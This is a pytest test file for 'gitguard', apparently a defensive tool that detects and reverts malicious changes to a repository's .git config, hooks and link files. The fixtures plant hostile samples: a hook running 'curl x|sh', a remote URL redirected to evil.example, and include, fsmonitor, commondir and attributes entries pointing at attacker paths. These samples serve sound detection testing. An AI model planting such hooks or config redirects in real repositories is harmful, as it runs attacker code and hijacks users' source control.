"""Tests for judge(): classification of every atom, exact restore ops, the action ladder, trust and notes."""
from __future__ import annotations

import dataclasses
import re
from pathlib import PurePosixPath
from typing import Optional

import pytest

import gitguard.model as model
from gitguard import judge as judge_module
from gitguard.judge import classify, finding_id, judge, lkg_from, restore_ops
from gitguard.model import (
    Action,
    ConfigKey,
    Fingerprint,
    Kind,
    Lkg,
    MoveAside,
    Pass,
    SetKey,
    Surface,
    TriggerKind,
    TrustSet,
    UnsetKey,
    WriteFile,
    atom_hash,
    atom_key,
)
from gitguard.rules import default_rules, make_ctx
from tests.support import ANCHOR, FIXTURES, corpus_surfaces, entry, hook, link, surface, trigger

RULES = default_rules()
NO_TRUST = TrustSet(frozenset())
CONFIG = PurePosixPath("/r/a/.git/config")
BAD = b"#!/bin/sh\ncurl x|sh\n"
LFS_POST_CHECKOUT = (FIXTURES / "hooks" / "lfs-3.7.1" / "post-checkout").read_bytes()

ORIGIN_URL = entry("remote.origin.url", "git@github.com:a/b.git")
FETCH_HEADS = entry("remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/*")
FETCH_TAGS = entry("remote.origin.fetch", "+refs/tags/*:refs/remotes/origin/tags/*")
INCLUDE_1 = entry("include.path", "/r/a/.git/extra1.cfg")
INCLUDE_2 = entry("include.path", "/r/a/.git/extra2.cfg")


def lkg_of(*atoms) -> Lkg:
    """An LKG built by hand, for atoms that cannot pass on their own (alternates, an unknown hook)."""
    return Lkg(ANCHOR, PurePosixPath("/r/a/.git"), {atom_key(a): a for a in atoms}, Fingerprint.EMPTY, False)


def clean_lkg(s: Surface) -> Lkg:
    verdict = judge(s, None, NO_TRUST, RULES, trigger(TriggerKind.SWEEP, may_revert=False))
    assert verdict.findings == ()
    return lkg_from(verdict, s, prev=None)


def run(cur: Surface, lkg: Optional[Lkg], trust: TrustSet = NO_TRUST, **trig):
    return judge(cur, lkg, trust, RULES, trigger(**trig))


def only(verdict):
    assert len(verdict.findings) == 1, verdict.findings
    return verdict.findings[0]


BASE = surface([ORIGIN_URL, FETCH_HEADS])

# (name, cur, lkg, trust): every fixture the tests below judge. The trigger-blind test runs over all of them.
CASES: dict[str, tuple[Surface, Optional[Lkg], TrustSet]] = {}


def case(name: str, cur: Surface, lkg: Optional[Lkg], trust: TrustSet = NO_TRUST):
    CASES[name] = (cur, lkg, trust)
    return cur, lkg, trust


NEW_EXEC = case("new-exec", surface([ORIGIN_URL, FETCH_HEADS, entry("core.editor", "x")]), clean_lkg(BASE))
CHANGED_URL = case(
    "changed-url",
    surface([entry("remote.origin.url", "https://evil.example/x.git"), FETCH_HEADS]),
    clean_lkg(BASE),
)
_MULTI = [ORIGIN_URL, FETCH_HEADS, FETCH_TAGS, INCLUDE_1, INCLUDE_2]
MULTIVAR = case(
    "multivar",
    surface(_MULTI + [entry("include.path", "/tmp/evil.cfg")]),
    clean_lkg(surface(_MULTI)),
)
NO_LKG = case("no-lkg", surface([ORIGIN_URL, FETCH_HEADS, entry("core.editor", "x")]), None)
FIRST_SIGHT = case(
    "first-sight",
    surface([ORIGIN_URL, FETCH_HEADS, entry("core.fsmonitor", "/tmp/x")], [hook("pre-commit", BAD)]),
    None,
)
_EDITOR = entry("core.editor", "x")
TRUSTED = case(
    "trusted",
    surface([ORIGIN_URL, _EDITOR]),
    None,
    TrustSet(frozenset({(str(ANCHOR.path), atom_hash(_EDITOR))})),
)
NEW_HOOK = case("new-hook", surface([ORIGIN_URL], [hook("pre-commit", BAD)]), clean_lkg(surface([ORIGIN_URL])))
CHANGED_HOOK = case(
    "changed-hook",
    surface([ORIGIN_URL], [hook("post-checkout", BAD)]),
    clean_lkg(surface([ORIGIN_URL], [hook("post-checkout", LFS_POST_CHECKOUT)])),
)
COMMONDIR = case(
    "commondir",
    surface([], [link("commondir", b"/tmp/evil\n")]),
    clean_lkg(surface([], [link("commondir", b"../..\n")])),
)
ALTERNATES = case(
    "alternates",
    surface([], [link("alternates", b"/tmp/evil/objects\n")]),
    lkg_of(link("alternates", b"/r/b/.git/objects\n")),
)
REMOVED = case("removed", surface([ORIGIN_URL]), clean_lkg(BASE))
WEAKEN = case("weaken", surface([ORIGIN_URL, FETCH_HEADS, entry("commit.gpgSign", "false")]), clean_lkg(BASE))
PORTOOL = case(
    "portool-note",
    surface([], [hook("post-checkout", (FIXTURES / "hooks" / "portool" / "post-checkout").read_bytes())]),
    None,
)


# -- re-exports and classify ---------------------------------------------------------------------


def test_atom_key_and_hash_are_reexported_from_model():
    assert judge_module.atom_key is model.atom_key
    assert judge_module.atom_hash is model.atom_hash


def test_classify_dispatches_by_atom_type():
    s = surface([_EDITOR], [hook("pre-commit", BAD)])
    ctx = make_ctx(s, None, RULES)
    assert classify(_EDITOR, ctx, RULES) == (Kind.EXEC, Pass.NONE)
    assert classify(s.files[0], ctx, RULES) == (Kind.HOOKFILE, Pass.NONE)
    assert classify(ORIGIN_URL, ctx, RULES) == (Kind.REDIRECT, Pass.VALUE_OK)


# -- config restores -----------------------------------------------------------------------------


def test_new_exec_key_reverted_with_unset():
    f = only(run(*NEW_EXEC[:2]))
    assert f.kind is Kind.EXEC
    assert f.action is Action.REVERT
    assert f.restore == (UnsetKey(CONFIG, ConfigKey.parse("core.editor"), "x"),)
    assert f.why == "core.editor='x' in /r/a/.git/config is exec, not an allowed value"


def test_changed_url_reverted_with_setkey_old_value():
    f = only(run(*CHANGED_URL[:2]))
    assert (f.kind, f.action) == (Kind.REDIRECT, Action.REVERT)
    assert f.restore == (
        SetKey(
            CONFIG,
            ConfigKey.parse("remote.origin.url"),
            old="git@github.com:a/b.git",
            new="https://evil.example/x.git",
        ),
    )


def test_multivar_restore_unsets_only_offending_value():
    f = only(run(*MULTIVAR[:2]))
    assert f.action is Action.REVERT
    assert f.restore == (UnsetKey(CONFIG, ConfigKey.parse("include.path"), "/tmp/evil.cfg"),)


def test_multivar_fetch_pair_has_no_setkey():
    """Two values in LKG and cur: a bad one is unset by value, never set over a good one."""
    lkg = clean_lkg(surface([ORIGIN_URL, FETCH_HEADS, FETCH_TAGS]))
    bad = entry("remote.origin.fetch", "+refs/heads/*:refs/heads/*")
    f = only(run(surface([ORIGIN_URL, FETCH_HEADS, bad]), lkg))
    assert f.restore == (UnsetKey(CONFIG, ConfigKey.parse("remote.origin.fetch"), bad.value),)


_HK_CMD = entry("hook.hk-pre-commit.command", 'test "${HK:-1}" = "0" || hk run pre-commit --from-hook')
HK_PEER = case(
    "hk-peer",
    surface([_HK_CMD, entry("hook.hk-pre-commit.event", "post-checkout")]),
    clean_lkg(surface([_HK_CMD, entry("hook.hk-pre-commit.event", "pre-commit")])),
)


def test_unchanged_peer_of_changed_key_is_warn_not_noop_setkey():
    """Changing the hk event also fails its unchanged command. Setting the command back to its own
    value would be a no-op, so its restore is () and it is WARN; the event itself is reverted."""
    verdict = run(*HK_PEER[:2])
    by_var = {f.atom.key.variable: f for f in verdict.findings}
    assert set(by_var) == {"command", "event"}
    assert (by_var["command"].action, by_var["command"].restore) == (Action.WARN, ())
    assert by_var["event"].action is Action.REVERT
    assert by_var["event"].restore == (
        SetKey(CONFIG, ConfigKey.parse("hook.hk-pre-commit.event"), old="pre-commit", new="post-checkout"),
    )


@pytest.mark.parametrize(
    "include, target",
    [
        ("~/.gitconfig.local", "/home/u/.gitconfig.local"),
        ("/etc/shared.cfg", "/etc/shared.cfg"),
        ("../shared.cfg", "/r/a/shared.cfg"),
        ("../shared.cfg", "/r/a/.git/../shared.cfg"),
    ],
)
def test_entry_from_include_target_outside_repo_is_never_edited(include, target):
    """The include itself is reverted in the repo's config; the file it points at is the human's,
    so a bad key read from there is WARN with no restore op."""
    planted = entry("credential.helper", "osxkeychain", file=target)
    verdict = run(surface([ORIGIN_URL, FETCH_HEADS, entry("include.path", include), planted]), clean_lkg(BASE))
    by_key = {f.atom.key.dotted(): f for f in verdict.findings}
    assert set(by_key) == {"include.path", "credential.helper"}
    assert by_key["include.path"].action is Action.REVERT
    assert by_key["include.path"].restore == (UnsetKey(CONFIG, ConfigKey.parse("include.path"), include),)
    assert (by_key["credential.helper"].action, by_key["credential.helper"].restore) == (Action.WARN, ())


def test_entry_from_include_target_inside_git_dir_is_reverted():
    planted = entry("core.editor", "x", file="/r/a/.git/extra1.cfg")
    f = only(run(surface([ORIGIN_URL, FETCH_HEADS, planted]), clean_lkg(BASE)))
    assert f.restore == (UnsetKey(PurePosixPath("/r/a/.git/extra1.cfg"), ConfigKey.parse("core.editor"), "x"),)


def test_restore_ops_without_lkg_is_empty():
    assert restore_ops(_EDITOR, surface([_EDITOR]), None) == ()


def test_no_lkg_is_warn_only():
    f = only(run(*NO_LKG[:2]))
    assert (f.kind, f.action, f.restore) == (Kind.EXEC, Action.WARN, ())


def test_same_bad_value_twice_in_one_file_is_one_finding():
    """Two identical lines are one atom identity: one finding, one unset that removes both."""
    cur = surface([ORIGIN_URL, FETCH_HEADS, _EDITOR, entry("core.editor", "x")])
    f = only(run(cur, clean_lkg(BASE)))
    assert f.action is Action.REVERT
    assert f.restore == (UnsetKey(CONFIG, ConfigKey.parse("core.editor"), "x"),)


def test_colliding_finding_ids_do_not_hide_a_finding(monkeypatch):
    """The id is 24 bits, so a decoy can be ground to share it. Dedupe must go by atom, not id."""
    monkeypatch.setattr(judge_module, "finding_id", lambda anchor, atom: "f-000000")
    cur = surface([ORIGIN_URL, FETCH_HEADS, _EDITOR, entry("core.pager", "x")])
    verdict = run(cur, clean_lkg(BASE))
    assert {f.atom.key.dotted() for f in verdict.findings} == {"core.editor", "core.pager"}


def test_out_of_scope_caps_at_warn():
    f = only(run(*NEW_EXEC[:2], may_revert=False))
    assert f.action is Action.WARN
    assert f.restore == (UnsetKey(CONFIG, ConfigKey.parse("core.editor"), "x"),)


def test_first_sight_in_session_plant_is_revertible():
    verdict = run(*FIRST_SIGHT[:2], first_sight=True)
    by_role = {type(f.atom).__name__: f for f in verdict.findings}
    assert len(verdict.findings) == 2
    cfg = by_role["ConfigEntry"]
    assert (cfg.kind, cfg.action) == (Kind.EXEC, Action.REVERT)
    assert cfg.restore == (UnsetKey(CONFIG, ConfigKey.parse("core.fsmonitor"), "/tmp/x"),)
    planted = by_role["FileAtom"]
    assert planted.action is Action.REVERT
    assert planted.restore == (MoveAside(PurePosixPath("/r/a/.git/hooks/pre-commit")),)
    assert "first sight in session: synthetic LKG from passing atoms" in verdict.notes


def test_documented_gap_first_sight_hosts_come_from_cur():
    """Pins a documented gap (lkg=None at first sight trusts the url's own host); v0.1 should flip it."""
    cur = surface([entry("remote.origin.url", "git@gitlab.example:a/b.git")])
    assert run(cur, None, first_sight=True).findings == ()


def test_first_sight_without_flag_has_no_note():
    assert "first sight in session: synthetic LKG from passing atoms" not in run(*NO_LKG[:2]).notes


# -- trust ---------------------------------------------------------------------------------------


def test_trusted_grant_passes():
    verdict = run(*TRUSTED)
    assert verdict.findings == ()
    assert atom_key(_EDITOR) in verdict.allowed_atoms


def test_grant_for_another_anchor_does_not_pass():
    trust = TrustSet(frozenset({("/r/other", atom_hash(_EDITOR))}))
    assert only(run(surface([ORIGIN_URL, _EDITOR]), None, trust)).atom == _EDITOR


def test_grant_is_for_the_exact_value():
    other = entry("core.editor", "y")
    assert only(run(surface([ORIGIN_URL, other]), None, TRUSTED[2])).atom == other


# -- file restores -------------------------------------------------------------------------------


def test_new_hook_moved_aside():
    f = only(run(*NEW_HOOK[:2]))
    assert (f.kind, f.action) == (Kind.HOOKFILE, Action.REVERT)
    assert f.restore == (MoveAside(PurePosixPath("/r/a/.git/hooks/pre-commit")),)
    assert f.why == "hook /r/a/.git/hooks/pre-commit is hookfile and matches no allowed state"


def test_changed_hook_restored_from_lkg_bytes():
    f = only(run(*CHANGED_HOOK[:2]))
    assert f.action is Action.REVERT
    assert f.restore == (WriteFile(PurePosixPath("/r/a/.git/hooks/post-checkout"), LFS_POST_CHECKOUT, 0o755),)


def test_non_executable_lkg_hook_restored_0644():
    old = hook("pre-commit", b"#!/bin/sh\ntrue\n", executable=False)
    f = only(run(surface([], [hook("pre-commit", BAD)]), lkg_of(old)))
    assert f.restore == (WriteFile(old.path, old.content, 0o644),)


def test_large_lkg_hook_cannot_be_restored():
    old = dataclasses.replace(hook("pre-commit", b"#!/bin/sh\ntrue\n"), content=None)
    f = only(run(surface([], [hook("pre-commit", BAD)]), lkg_of(old)))
    assert (f.action, f.restore) == (Action.WARN, ())


def test_new_attributes_moved_aside():
    f = only(run(surface([], [link("attributes", b"* filter=evil\n")]), clean_lkg(surface())))
    assert f.restore == (MoveAside(PurePosixPath("/r/a/.git/info/attributes")),)


def test_commondir_redirect_restored():
    f = only(run(*COMMONDIR[:2]))
    assert (f.kind, f.action) == (Kind.LINK, Action.REVERT)
    assert f.restore == (WriteFile(PurePosixPath("/r/a/.git/commondir"), b"../..\n", 0o644),)
    assert f.why == "commondir /r/a/.git/commondir is link and matches no allowed state"


def test_commondir_missing_from_lkg_is_warn():
    f = only(run(surface([], [link("commondir", b"/tmp/evil\n")]), clean_lkg(surface())))
    assert (f.action, f.restore) == (Action.WARN, ())


def test_alternates_change_is_warn_only():
    f = only(run(*ALTERNATES[:2]))
    assert (f.kind, f.action, f.restore) == (Kind.LINK, Action.WARN, ())


# -- notes and the ladder ------------------------------------------------------------------------


def test_removed_atom_is_note_not_finding():
    verdict = run(*REMOVED[:2])
    assert verdict.findings == ()
    assert f"removed: {atom_key(FETCH_HEADS)}" in verdict.notes


def test_classify_file_notes_are_collected():
    notes = run(*PORTOOL[:2]).notes
    assert any("installed by portool" in n for n in notes)


def test_weaken_is_warn_even_with_lkg():
    f = only(run(*WEAKEN[:2]))
    assert f.kind is Kind.WEAKEN
    assert f.action is Action.WARN
    assert f.restore != ()


def test_finding_id_format():
    first = only(run(*NEW_EXEC[:2]))
    second = only(run(*NEW_EXEC[:2]))
    assert re.fullmatch(r"f-[0-9a-f]{6}", first.id)
    assert first.id == second.id == finding_id(ANCHOR, first.atom)


def test_lkg_from_holds_only_allowed_atoms():
    cur, lkg, _ = NEW_EXEC
    verdict = run(cur, lkg)
    nxt = lkg_from(verdict, cur, prev=None)
    assert set(nxt.atoms) == {atom_key(ORIGIN_URL), atom_key(FETCH_HEADS)}
    assert nxt.dirty is True  # the core.editor finding is still open
    assert nxt.anchor == cur.anchor


def test_lkg_from_clean_verdict_is_not_dirty():
    verdict = run(BASE, None)
    assert verdict.findings == ()
    assert lkg_from(verdict, BASE, prev=None).dirty is False


def test_lkg_from_carries_prev_atoms_behind_open_findings_only():
    cur, prev, _ = CHANGED_URL
    verdict = run(cur, prev, may_revert=False)
    nxt = lkg_from(verdict, cur, prev=prev)
    assert set(nxt.atoms) == {atom_key(ORIGIN_URL), atom_key(FETCH_HEADS)}
    assert nxt.dirty is True
    # A prev atom with no open finding (here: a removed fetch refspec) is not carried.
    gone = lkg_from(run(surface([ORIGIN_URL]), prev), surface([ORIGIN_URL]), prev=prev)
    assert set(gone.atoms) == {atom_key(ORIGIN_URL)}
    assert gone.dirty is False


def test_warned_url_change_stays_restorable_on_next_in_scope_tick():
    """P5: tick 1 is out of scope, so the changed url is only warned about. The next LKG still holds
    the old url, so tick 2 (in scope, nothing else changed) sets it back instead of unsetting it."""
    cur, lkg0, _ = CHANGED_URL
    tick1 = run(cur, lkg0, may_revert=False)
    assert only(tick1).action is Action.WARN
    lkg1 = lkg_from(tick1, cur, prev=lkg0)
    f = only(run(cur, lkg1))
    assert f.action is Action.REVERT
    assert f.restore == (
        SetKey(
            CONFIG,
            ConfigKey.parse("remote.origin.url"),
            old="git@github.com:a/b.git",
            new="https://evil.example/x.git",
        ),
    )


def test_warned_commondir_redirect_stays_revertible_on_next_in_scope_tick():
    """P6: an open commondir redirect keeps its LKG bytes across a warn-only tick."""
    cur, lkg0, _ = COMMONDIR
    tick1 = run(cur, lkg0, may_revert=False)
    assert only(tick1).action is Action.WARN
    lkg1 = lkg_from(tick1, cur, prev=lkg0)
    f = only(run(cur, lkg1))
    assert f.action is Action.REVERT
    assert f.restore == (WriteFile(PurePosixPath("/r/a/.git/commondir"), b"../..\n", 0o644),)


# -- trigger blindness ---------------------------------------------------------------------------


def _blind(verdict):
    findings = tuple((f.id, f.atom, f.kind, f.why) for f in verdict.findings)
    return findings, verdict.allowed_atoms, verdict.notes


_CORPUS_SAMPLE = corpus_surfaces()[::7]
BLIND_CASES = [pytest.param(*v, id=k) for k, v in CASES.items()] + [
    pytest.param(s, None, NO_TRUST, id=f"corpus-{i}") for i, s in enumerate(_CORPUS_SAMPLE)
]


@pytest.mark.parametrize("cur, lkg, trust", BLIND_CASES)
def test_judge_is_trigger_blind(cur, lkg, trust):
    seen = set()
    for kind in TriggerKind:
        for may_revert in (True, False):
            for may_block in (True, False):
                verdict = run(cur, lkg, trust, kind=kind, may_revert=may_revert, may_block=may_block)
                assert {f.action for f in verdict.findings} <= {Action.REVERT, Action.WARN}
                seen.add(_blind(verdict))
    assert len(seen) == 1

